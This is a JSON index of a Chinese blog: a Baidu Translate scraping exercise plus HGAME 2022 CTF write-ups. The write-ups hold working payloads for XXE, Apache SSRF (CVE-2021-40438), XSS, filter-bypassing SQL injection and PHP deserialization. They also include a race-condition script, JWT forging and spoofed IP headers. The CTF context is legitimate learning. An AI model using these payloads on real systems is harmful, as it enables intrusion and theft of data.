[{"title":"记对百度翻译的一次爬虫练习","url":"/2022/02/23/baidufanyi-project/","content":"最近简单学习了一下 requests 这个模块，一直没有亲自实战一下，然后就有了这次的实战练习\n浏览器F12对百度翻译进行抓包\n随便输入一个词句抓包\n我们主要要获取这里的数据\n\n而这里的数据是对https://fanyi.baidu.com/v2transapi?from=zh&amp;to=en这个链接发起的一次post请求\n可以看到请求表单中发送的关键数据\n\n尝试其他词句发现主要变化的是sign，还有token这两个关键变量\n在当前页面审查元素就能发现这个token\n\n现在关键是这个sign\n查看一下这个post方法的请求栈\n\n主要是index和public这两个js文件，打开搜索一下payload中的sign，发现在index这个js文件里有这个payload\n\n可以发现这里和post表单中的数据格式一样\n\n现在看看这个sign它是怎么生成的\n在sign: L(e)这里打一个断点调试一下\n刷新页面，来到这个sign处，然后点击单步调试\n\n然后跳转到了e(r)这个函数，这个应该就是生成sign的函数\n\n同时发现传递的参数正好是你输入的词句\n那么继续单步调试，到函数的末尾发现又调用了一个n(r, o)函数\n\n继续运行，结束\n经过上面的调试发现，这个sign就是使用了上面两个函数对输入的词句进行加密操作，具体的算法比较复杂，不需要搞懂它，我们可以使用python中的execujs这个库来运行，这个js代码，得到加密后的sign\n先不要急，在浏览器跑一下这个加密代码\ncv到控制台，输入参数运行\n\n发现报错了，查看报错列表知道是 i 这个变量没有定义\n那么继续回到原来的调试\n找到这个变量 i ，打个断点\n\n运行，发现这个变量 i 的值为 320305.131321201\n\n改变输入的词句发现这个 i 始终是个定值，都是 320305.131321201 ，那么现在所有的问题基本上就解决了，\n剩下的就是写爬虫脚本，代码如下\n对应 sign 的js代码\ni = '320305.131321201';\n\nfunction n(r, o) &#123;\n    for (var t = 0; t &lt; o.length - 2; t += 3) &#123;\n      var a = o.charAt(t + 2);\n      a = a >= 'a' ? a.charCodeAt(0) - 87 : Number(a),\n      a = '+' === o.charAt(t + 1) ? r >>> a : r &lt;&lt; a,\n      r = '+' === o.charAt(t) ? r + a &amp; 4294967295 : r ^ a\n    &#125;\n    return r\n  &#125;\n  function e(r) &#123;\n    var o = r.match(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/g);\n    if (null === o) &#123;\n      var t = r.length;\n      t > 30 &amp;&amp; (r = '' + r.substr(0, 10) + r.substr(Math.floor(t / 2) - 5, 10) + r.substr( - 10, 10))\n    &#125; else &#123;\n      for (var e = r.split(/[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]/), C = 0, h = e.length, f = [\n      ]; h > C; C++) '' !== e[C] &amp;&amp; f.push.apply(f, a(e[C].split(''))),\n      C !== h - 1 &amp;&amp; f.push(o[C]);\n      var g = f.length;\n      g > 30 &amp;&amp; (r = f.slice(0, 10).join('') + f.slice(Math.floor(g / 2) - 5, Math.floor(g / 2) + 5).join('') + f.slice( - 10).join(''))\n    &#125;\n    var u = void 0,\n    l = '' + String.fromCharCode(103) + String.fromCharCode(116) + String.fromCharCode(107);\n    u = null !== i ? i : (i = window[l] || '') || '';\n    for (var d = u.split('.'), m = Number(d[0]) || 0, s = Number(d[1]) || 0, S = [\n    ], c = 0, v = 0; v &lt; r.length; v++) &#123;\n      var A = r.charCodeAt(v);\n      128 > A ? S[c++] = A : (2048 > A ? S[c++] = A >> 6 | 192 : (55296 === (64512 &amp; A) &amp;&amp; v + 1 &lt; r.length &amp;&amp; 56320 === (64512 &amp; r.charCodeAt(v + 1)) ? (A = 65536 + ((1023 &amp; A) &lt;&lt; 10) + (1023 &amp; r.charCodeAt(++v)), S[c++] = A >> 18 | 240, S[c++] = A >> 12 &amp; 63 | 128) : S[c++] = A >> 12 | 224, S[c++] = A >> 6 &amp; 63 | 128), S[c++] = 63 &amp; A | 128)\n    &#125;\n    for (var p = m, F = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(97) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(54)), D = '' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(51) + ('' + String.fromCharCode(94) + String.fromCharCode(43) + String.fromCharCode(98)) + ('' + String.fromCharCode(43) + String.fromCharCode(45) + String.fromCharCode(102)), b = 0; b &lt; S.length; b++) p += S[b],\n    p = n(p, F);\n    return p = n(p, D),\n    p ^= s,\n    0 > p &amp;&amp; (p = (2147483647 &amp; p) + 2147483648),\n    p %= 1000000,\n    p.toString() + '.' + (p ^ m)\n  &#125;\n\n\n\npython脚本\nimport execjs\nimport requests\nimport re\nimport json\nmainUrl = 'https://fanyi.baidu.com'\ntrsUrl = 'https://fanyi.baidu.com/v2transapi'\n\nwith open('sign.js', 'r') as file:# sign.js从浏览器对应的文件中复制过来\n    jsCode = file.read()\n\nsession = requests.session()\nindexResp = session.get(mainUrl)\ntoken = re.findall(\"token: '(.*?)'\", indexResp.text)[0]\n\ndef translate(word):\n    data = &#123;\n        # 这里将from和to参数改为auto发现可以任意语言翻译为中文，中文翻译为英文，可自动切换\n        \"from\": \"auto\",\n        \"to\": \"auto\",\n        \"query\": word,\n        \"transtype\": \"realtime\",\n        \"simple_means_flag\": \"3\",\n        \"sign\": execjs.compile(jsCode).call('e', word),\n        \"token\": token,\n        \"domain\": \"common\"\n    &#125;\n    return session.post(trsUrl, data=data).text\nif __name__ == '__main__':\n    word = input('请输入要翻译的词句: ')\n    response = translate(word)\n    print(json.loads(response)['trans_result']['data'][0]['dst'])\n\n最后测试，中英文都没问题\n\n\n","categories":[],"tags":["爬虫 python"]},{"title":"HGAME 2022 Week4 writeup by pankas","url":"/2022/02/17/week4-pankas/","content":"最后一周我又摆烂了。    (QAQ)\nwebComment查看下源码\n关键部分\nfunction parseXML($str) &#123;\n    $dom = new DOMDocument();\n    try &#123;\n        $dom->loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD);\n    &#125; catch (Exception $e) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'invalid xml data']);\n        die();\n    &#125;\n    $attrs = simplexml_import_dom($dom);\n    if (!isset($attrs->content)) &#123;\n        http_response_code(400);\n        echo json_encode(['error' => 'content is empty']);\n        die();\n    &#125;\n    if (waf($attrs->sender) || waf($attrs->content)) &#123;\n        http_response_code(403);\n        echo json_encode(['error' => 'Hacker!']);\n        die();\n    &#125;\n    if ($attrs->sender == 'admin' &amp;&amp; !preg_match('/admin/i', $str)) &#123;\n        $flag = 'hgame&#123;xxxxx&#125;';\n        $attrs->content = $flag;\n    &#125;\n    return $attrs;\n&#125;\n\n结合前端post的请求\n\n这里存在XXE漏洞\n那么要让post的字符串没有admin但是转化后的XML对象的&lt;sender&gt;要为admin\n这里waf过滤了很多伪协议，但data://伪协议没有过滤\n所以可以构造payload\n&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY payload SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,YWRtaW4&#x3D;&quot;&gt; \n]&gt;\n&lt;comment&gt;&lt;sender&gt;&amp;payload;&lt;&#x2F;sender&gt;&lt;content&gt;flag&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;\n\n其中YWRtaW4=为admin的base64编码，这样检测字符串时没有admin，但实例化xml对象后由于data伪协议&lt;sender&gt;变为了admin，拿到flag\n\n","categories":["CTF-WP"],"tags":["CTF HGAME"]},{"title":"HGAME 2022 Week3 writeup by pankas","url":"/2022/02/10/week3-pankas/","content":"week3过年摆了，基本根本没做，惭愧·········\nwebVidar shop demo条件竞争，开多线程刷钱，够了就可以买flag了\nimport requests\nimport threading\nimport json\npayUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/pay/create'\ncreateOrderUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/create'\nsellUrl = 'http://4766634820.vidar-shop.mjclouds.com/api/order/remove'\nheaders = &#123;\n        'Host': '4766634820.vidar-shop.mjclouds.com',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',\n        'Accept': 'application/json, text/plain, */*',\n        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',\n        'Accept-Encoding': 'gzip, deflate',\n        'Content-Type': 'application/json',\n        'Authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQyMDYzODUsImlhdCI6MTY0NDExOTk4NSwidWlkIjozNTF9.c4d_p8TutNYanYK7KPIJwuLFR9tkAIvdLZFhqPT_0jE',\n        'Origin': 'http://4766634820.vidar-shop.mjclouds.com',\n        'Connection': 'keep-alive',\n        'Referer': 'http://4766634820.vidar-shop.mjclouds.com/'\n    &#125;\ncreateData = &#123;\n        \"amount\": 1,\n        \"pid\": 5,\n        \"status\": 1,\n        \"uid\": 351\n    &#125;\ndef pay():\n    response = requests.post(createOrderUrl, data=json.dumps(createData), headers=headers)\n    oid = json.loads(response.text)['id']\n    payData = &#123;\n        'amount': 20,\n        'oid': oid,\n        'uid': 351\n    &#125;\n    requests.post(payUrl, data=json.dumps(payData), headers=headers)\n    return oid\ndef sell(oid):\n    # print(oid)\n    sellData = &#123;\n        'id': oid\n    &#125;\n    r = requests.post(sellUrl, data=json.dumps(sellData), headers=headers)\n    print(r.text)\ndef solve():\n    oid = pay()\n    for j in range(50):\n        threading.Thread(target=sell(oid)).start()\nif __name__ == '__main__':\n    for i in range(20):\n        threading.Thread(target=solve()).start()\n\n\n\n","categories":["CTF-WP"],"tags":["CTF HGAME"]},{"title":"HGAME 2022 Week2 writeup by pankas","url":"/2022/02/03/week2-pankas/","content":"webApache!打开题目F12查看源码发现hint\n\n下载附件得到Apache的配置文件\n在default.conf文件下发现flag在**&#x2F;falg**，并且500这个页面也有提示要在内网才能访问到根目录的flag\n结合hint可以知道要用到Apache的CVE-2021-40438这个漏洞，本质就是SSRF\n参考文章：\nCVE-2021-40438 poc|Apache SSRF漏洞poc - 🔰雨苁ℒ🔰 (ddosi.org)\n则可以构造payload\nGET /proxy?unix|http://internal.host/flag HTTP/1.1\nHost: httpd.summ3r.top:60010\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.96822747.1642680058; __gads=ID=4b3dca87d022d0d1-228a4a0003d00030:T=1642683351:RT=1642683351:S=ALNI_MaeO4O3BpsWq8DZeC3LDGGcOfbqYA\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMT\nIf-None-Match: \"22a-5d664045f9580\"\n\n拿到flag\n\nwebpack-engine很简单的一道题，用chrome浏览器打开得到一串明显是用base64加密的字符串\n\n进行两次base64 解码拿到flag\n\nAt0m的留言板一道XSS题\n发现在head标签中存在flag\n\n关注公众号发送消息发现是可以在该页面显示\n测试发现**&lt;img&gt;**标签未被过滤，那么可以构造payload\n&lt;img src=\"\" onerror=\"function inject()&#123;document.querySelector('.content').textContent=\ndocument.querySelector('head').textContent;&#125; inject();\">\n\n用微信发送从而得到flag（手慢痛失红包QAQ）\n\nPokemon打开F12发现hint\n\nid为1，2，3时都是pokemon，其他情况是404\n\n发现该页面从在SQL注入\n其过滤了'select'，'from'，'where'，'='，' '，'/**/'，'and'，'or'\n可以使用双写的方法绕过\n空格和&#x2F;**&#x2F;可以用&#x2F;*h*&#x2F;绕过\n\n# 使用\n\n1&#x2F;*h*&#x2F;OorRDER&#x2F;*h*&#x2F;BY&#x2F;*h*&#x2F;2;#\n\n# 发现其是两个字段，其他数字报错\n# 查询一下数据库\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,database();#\n\n# 发现有pokemon这个数据库\n# 再看一下这个pokemon这个数据库里的表名\nps:注意information这个单词里含有过滤的关键字 or\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(table_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.tables&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n# 发现fllllllllaaaaaag这个表\n# 再看一下这个表里有什么字段\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(column_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.columns&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_name&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;fllllllllaaaaaag&#39;&#x2F;*h*&#x2F;ANandD&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n#发现该表里存在名为flag的字段\n#查看flag\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,flag&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;fllllllllaaaaaag;#\n\n# 拿到 \n\n\n一本单词书常规F12打开发现hint\n\n下载附件得到网站源码\n\n可以找到登录用户名为:adm1n,密码可使用数字加字母的方式绕过，即password可以填上:1080a\n输入用户名和密码进去\n这个页面为index.php\n\n继续审一审附件中的代码发现存在反序列化漏洞\n同时发现flag在   /flag\n表单传进去的数据以key:value的形式保存进行处理，在encode()中key不会被序列化value会进行序列化并且原key和序列化后的value会以**|**进行分隔\n关键是这个encode()函数和decode()函数\nfunction encode($data): string &#123;\n    $result = '';\n    foreach ($data as $k => $v) &#123;\n        $result .= $k . '|' . serialize($v);\n    &#125;\n\n    return $result;\n&#125;\n\nfunction decode(string $data): Array &#123;\n    $result = [];\n    $offset = 0;\n    $length = \\strlen($data);\n    while ($offset &lt; $length) &#123;\n        if (!strstr(substr($data, $offset), '|')) &#123;\n            return [];\n        &#125;\n        $pos = strpos($data, '|', $offset);\n        $num = $pos - $offset;\n        $varname = substr($data, $offset, $num);\n        $offset += $num + 1;\n        $dataItem = unserialize(substr($data, $offset));\n\n        $result[$varname] = $dataItem;\n        $offset += \\strlen(serialize($dataItem));\n    &#125;\n    return $result;\n&#125;\n\n在decode时会以 | 来区分key和序列化后的value（key未被序列化）\n再看Evil.php，其可以输出flag，只需将这个file覆盖为/flag即可\n&lt;?php\n\nclass Evil &#123;\n    public $file;\n    public $flag;\n\n    public function __wakeup() &#123;\n        $content = file_get_contents($this->file);\n        if (preg_match(\"/hgame/\", $content)) &#123;\n            $this->flag = 'hacker!';\n        &#125;\n        $this->flag = $content;\n    &#125;\n&#125;\n\n\n\n\n既然key不会被encode，那可以在key这个地方传入序列化后的Evil类对象，然后再decode这个key，得到Evil对象，之后自动调用__wakeup()这个函数，拿到flag。那么要让key在decode()函数中反序列化可在最前面加上一个  |  进行绕过，这样就可以把这个key当作value来处理，则可以构造payload\n|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;&#x2F;flag&quot;;s:4:&quot;flag&quot;;N;&#125;\n\n输入到 “单词框”\n\n拿到flag\n\nmisc奇妙小游戏nc连接\n\n首先要完成这个，直接使用pwntools这个库写脚本\nimport hashlib\nfrom string import ascii_letters, digits\nfrom pwn import *\nfrom itertools import product\ntable = ascii_letters + digits\nclass Solve():\n    def __init__(self):\n        self.sh = remote('chuj.top', 51003)\n    def proof_of_work(self):\n        proof = self.sh.recvuntil(b'input your ????> ').decode()\n        # print(proof)\n        find_index = proof.find('????')\n        tail = proof[find_index:find_index + 4]\n        _hash = proof[find_index + 9:proof.find('\\ninput')]\n        # print(_hash)\n        for i in product(table, repeat=4):\n            t = hashlib.sha256((''.join(i)).encode()).hexdigest()\n            if t == _hash:\n                self.sh.sendline(''.join(i).encode())\n                print(''.join(i))\n                # print(t)\n                break\n\n    def solve(self):\n        self.proof_of_work()\n        self.sh.interactive()\n\nif __name__ == '__main__':\n    solution = Solve()\n    solution.solve()\n\n运行得到\n\n要玩这个小游戏，鬼脚图，玩通过就能拿到flag了\n\n","categories":["CTF-WP"],"tags":["CTF HGAME"]},{"title":"HGAME 2022 Week1 writeup by pankas","url":"/2022/01/27/week1-pankas/","content":"webeasy_auth​    先看一下题目，有提示\n​    尊贵的admin写了个todo帮助自己管理日常，但他好像没调试完就部署了….一个月后，当他再一次打开他的小网站，似乎忘记了密码…他的todo之前记录了很重要的东西，快帮帮他不要爆破！\n这里目标网站时在开发中的，flag应该在admin用户里。\n\n打开发现输入admin密码随便写一个，结果不对，那注册一个看看\n注册号登录进去\n\n\n看了下这个页面也没什么，抓一下包发现token\n\n这个token是JWT，网上搜索一下进能知道只要找到了JWT的secret就可以伪造token发送到服务器通过验证了\n由于题目说是还在调试当中， 猜测secret为空，试一试。\n到jwt.io这个网站里\n\n将UserName改为admin，ID改为1(最贵的admin开发者肯定是网站注册的第一个人)，下面的secret为空，\n将修改后的token发送\n\n拿到flag\n\n这里简单说一下原理\n验证方法：首先服务端会产生一个secret，然后以这个secret作为密钥，使用第一部分选择的加密方式（这里就是HS256），对第一部分和第二部分拼接的结果进行加密，然后把加密结果放到第三部分。因为加密算法我们已经知道了，如果我们只要再得到加密的secret，我们就能伪造数据，并且通过服务器的检查。\nTetris plus提示说要玩够3000分，不可能的。像这类浏览器小游戏那肯定是先查看js源码。\n\n结果在这个checking.js文件里发现了jsfuck代码，jsfuck可以直接放到控制台运行，试试看。\n\n放到控制台运行拿到flag。\nFujiwara Tofu Shop秋名山飙车啊，进去看一看。\n\n\n提示说首先要到qiumingshan.net这个地方去，那么在web中的意思就是要让你的referer为qiumingshan.net\n用HackBar添加请求头referer\n\n\nExecute后又出现\n\n\n通行证啊，那么修改一下User-Agent为Hachi-Roku即可\n\n\n继续得到\n\n\n要求其cookie的味道是Raspberry，那么在Cookies上添加上flavor=Raspberry\n\n\n之后…..还有，要求加油到100，查看请求头可以看到当前Gasoline为0\n\n那么在请求头里添加上Gasoline: 100即可\n\n之后又要求其请求从本地发出来\n\n\n\n\n那可以使用伪造请求IP的方法，又如下几种\nX-Forwarded-For:\nX-Forwarded-Host:\nX-Client-IP:\nX-remote-IP:\nX-remote-addr:\nTrue-Client-IP:\nClient-IP:\nX-Real-IP:\n\n全都试一遍发现只有X-Real-IP没有被ban，伪造IP为本地127.0.0.1\n\n\n执行后成功拿到flag\n\n蛛蛛…嘿嘿♥我的蛛蛛这题也是个小游戏，这个按钮也是越点越多，而且只有一个是真的。先玩几关看一下它响应的内容，很有规律。\n每次都会在原url基础上拼接一个?key=##########。那直接交给爬虫。\n\n不废话，上代码。\nimport requests\nimport time\ndef run(url):\n    newUrl = url\n    while True:\n        response = requests.get(newUrl)\n        print(response.text[response.text.find('&lt;h1>')+4:response.text.find('&lt;/h1>')])\n        index = response.text.find('?key')# 没有找到find返回-1\n        if index == -1:\n            print(newUrl)\n            exit(0)\n        text = response.text[index:]\n        newUrl = url + text[:text.find('\">')]\n        time.sleep(0.5)\nif __name__ == '__main__':\n    run('https://hgame-spider.vidar.club/90bc5cb81b')\n\n\n\n发现在100关后面，点开爬到的url\n\n\n在请求头里发现flag\nMisc好康的流量下载附件拿到一份截获的流量，用wireshark打开用导出为邮件\n\n拿到涩图\n\n\n这个图片试了很多方法，最后发现使用stegsolver打开发现一个条形码。\n\n扫码拿到一半的flag。\n还有一半应该是lsb隐藏的。\n\n使用工具拿到另一半。（这里其实是试出来的）\n饭卡的uno下载附件使用 010editor打开就是flag\n\n","categories":["CTF-WP"],"tags":["CTF HGAME"]}]